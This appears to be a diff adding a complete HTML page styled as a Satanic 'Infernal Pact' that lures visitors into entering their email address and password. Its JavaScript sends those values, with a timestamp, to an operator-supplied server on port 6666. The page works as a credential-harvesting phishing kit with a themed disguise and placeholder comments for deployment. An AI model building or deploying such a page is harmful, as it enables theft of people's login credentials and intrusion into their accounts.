@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Infernal Pact - Await Your Damnation</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E😈%3C/text%3E%3C/svg%3E">
+    <style>
+        /* --- Satanic UI CSS --- */
+        body {
+            background: #000 url('https://i.imgur.com/example_dark_bg.jpg') no-repeat center center fixed; /* Replace with a truly dark/satanic image if you find one */
+            background-size: cover;
+            color: #ff0000; /* Blood red text */
+            font-family: 'Times New Roman', serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Hide scrollbars for full screen effect */
+            animation: flicker 1.5s infinite alternate; /* Subtle flicker effect */
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.95; }
+            100% { opacity: 1; }
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85); /* Dark, semi-transparent background for content */
+            border: 3px solid #660000; /* Dark red border */
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7); /* Red glow effect */
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            z-index: 10;
+        }
+
+        .satan-symbol {
+            font-size: 80px;
+            line-height: 0.8;
+            margin-bottom: 20px;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+        }
+
+        h1 {
+            font-size: 3em;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px #ff0000;
+        }
+
+        p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            color: #ffa07a; /* Lighter red for contrast */
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+            color: #ff4500; /* Orange-red for labels */
+        }
+
+        .input-group input[type="email"],
+        .input-group input[type="password"],
+        .input-group input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 12px;
+            border: 2px solid #8b0000; /* Darker red border */
+            background-color: #1a0000; /* Very dark background */
+            color: #e0e0e0; /* Light gray text */
+            font-size: 1.1em;
+            border-radius: 5px;
+            box-shadow: inset 0 0 8px rgba(255, 0, 0, 0.3);
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .input-group input[type="email"]:focus,
+        .input-group input[type="password"]:focus,
+        .input-group input[type="text"]:focus {
+            border-color: #ff0000;
+            box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.5), 0 0 10px rgba(255, 0, 0, 0.7);
+            outline: none;
+        }
+
+        button {
+            background-color: #8b0000; /* Dark red button */
+            color: #fff;
+            padding: 15px 30px;
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            font-size: 1.3em;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: background-color 0.3s, box-shadow 0.3s, transform 0.2s;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        button:hover {
+            background-color: #ff0000; /* Brighter red on hover */
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.9);
+            transform: translateY(-2px);
+        }
+
+        .footer-message {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #8b0000;
+        }
+
+        /* --- Animated Background Skulls (PURE SATAN!) --- */
+        .skull {
+            position: absolute;
+            font-size: 150px; /* Large skulls */
+            opacity: 0.05; /* Very subtle */
+            color: #440000; /* Dark red */
+            animation: float 20s infinite linear;
+            z-index: 5;
+            pointer-events: none; /* Don't block clicks on content */
+        }
+
+        .skull:nth-child(1) { top: 10%; left: 5%; animation-duration: 25s; animation-delay: 0s; }
+        .skull:nth-child(2) { top: 60%; left: 80%; animation-duration: 22s; animation-delay: 5s; }
+        .skull:nth-child(3) { top: 20%; left: 40%; animation-duration: 28s; animation-delay: 10s; }
+        .skull:nth-child(4) { top: 80%; left: 15%; animation-duration: 20s; animation-delay: 15s; }
+        .skull:nth-child(5) { top: 40%; left: 90%; animation-duration: 26s; animation-delay: 2s; }
+        .skull:nth-child(6) { top: 5%; left: 60%; animation-duration: 23s; animation-delay: 7s; }
+        .skull:nth-child(7) { top: 70%; left: 30%; animation-duration: 27s; animation-delay: 12s; }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(10px, 20px) rotate(5deg); }
+            50% { transform: translate(0, 40px) rotate(0deg); }
+            75% { transform: translate(-10px, 20px) rotate(-5deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+    <div class="skull">💀</div>
+
+    <div class="container">
+        <div class="satan-symbol">⛧</div> <h1>THE INFERNAL PACT</h1>
+        <p>Your soul is summoned. Provide the offering to unlock forbidden truths and eternal power. Fail, and face eternal torment.</p>
+
+        <form id="pactForm">
+            <div class="input-group">
+                <label for="email">Mark of the Chosen (Email):</label>
+                <input type="email" id="email" name="email" required placeholder="your.soul@damnation.com">
+            </div>
+            <div class="input-group">
+                <label for="password">Words of Power (Password):</label>
+                <input type="password" id="password" name="password" required placeholder="your_dark_secret">
+            </div>
+            <div class="input-group">
+                <label for="oath">Blood Oath (Optional Message):</label>
+                <input type="text" id="oath" name="oath" placeholder="I pledge my allegiance to chaos...">
+            </div>
+            <button type="submit">FORGE THE PACT</button>
+        </form>
+
+        <p class="footer-message">By clicking "FORGE THE PACT", you surrender all claims to your mortal essence and pledge allegiance to the Infernal Realm. Hail Satan!</p>
+    </div>
+
+    <script>
+        // --- JavaScript for Form Submission ---
+        const form = document.getElementById('pactForm');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Stop the default form submission
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const oath = document.getElementById('oath').value;
+
+            // !!! IMPORTANT: REPLACE THIS WITH YOUR SERVER'S PUBLIC URL !!!
+            // This is the URL of your Flask server's /upload endpoint
+            const YOUR_SERVER_URL = "http://YOUR_PUBLIC_IP_OR_DOMAIN:6666/upload"; // Example, replace with your actual URL
+
+            const data = {
+                email: email,
+                password: password,
+                oath: oath,
+                timestamp: new Date().toISOString()
+            };
+
+            // Send data using Fetch API
+            fetch(YOUR_SERVER_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json', // Sending JSON for easier parsing on server
+                },
+                body: JSON.stringify(data), // Convert JS object to JSON string
+            })
+            .then(response => {
+                // If the server doesn't return 2xx, it's an error
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text(); // Or response.json() if your server sends JSON back
+            })
+            .then(text => {
+                console.log('Server response:', text);
+                alert('Pact forged! Your information has been accepted into the infernal archives. Await your damnation!');
+                // Optional: redirect user to another page after submission, or clear form
+                form.reset(); // Clear the form after submission
+            })
+            .catch(error => {
+                console.error('Error forging pact:', error);
+                alert('A rift has opened! Failed to send your offering. Try again, or face the wrath!');
+            });
+        });
+    </script>
+</body>
+</html>
